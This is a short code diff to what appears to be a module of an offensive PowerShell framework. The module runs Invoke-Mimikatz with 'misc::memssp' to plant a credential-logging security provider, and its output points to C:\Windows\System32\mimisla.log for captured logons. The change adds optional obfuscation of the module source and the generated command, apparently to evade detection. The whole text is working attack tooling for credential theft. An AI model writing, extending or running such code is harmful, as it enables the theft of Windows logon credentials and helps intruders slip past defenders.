@@ -53,11 +53,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -73,8 +75,10 @@ class Module:
         command = "misc::memssp"
 
         # base64 encode the command to pass to Invoke-Mimikatz
-        script += "Invoke-Mimikatz -Command '\"" + command + "\"';"
+        scriptEnd = "Invoke-Mimikatz -Command '\"" + command + "\"';"
 
-        script += '"memssp installed, check C:\Windows\System32\mimisla.log for logon events."'
-
+        scriptEnd += '"memssp installed, check C:\Windows\System32\mimisla.log for logon events."'
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
